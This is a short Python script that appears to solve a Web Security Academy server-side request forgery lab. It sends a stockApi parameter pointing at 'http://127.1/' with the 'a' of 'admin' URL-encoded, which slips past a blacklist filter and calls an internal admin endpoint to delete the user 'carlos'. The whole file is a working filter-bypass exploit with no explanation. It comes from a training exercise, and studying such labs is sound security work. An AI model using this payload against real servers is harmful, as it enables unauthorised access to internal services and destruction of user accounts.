import requests
stock_url = 'https://ac281fa71e50ec1e801f6809003600de.web-security-academy.net/product/stock'

a = '''%61'''

ssrf_data = {
   'stockApi' : f'http://127.1/{a}dmin/delete?username=carlos'
}
resp = requests.post(stock_url, data=ssrf_data)
print(resp.text)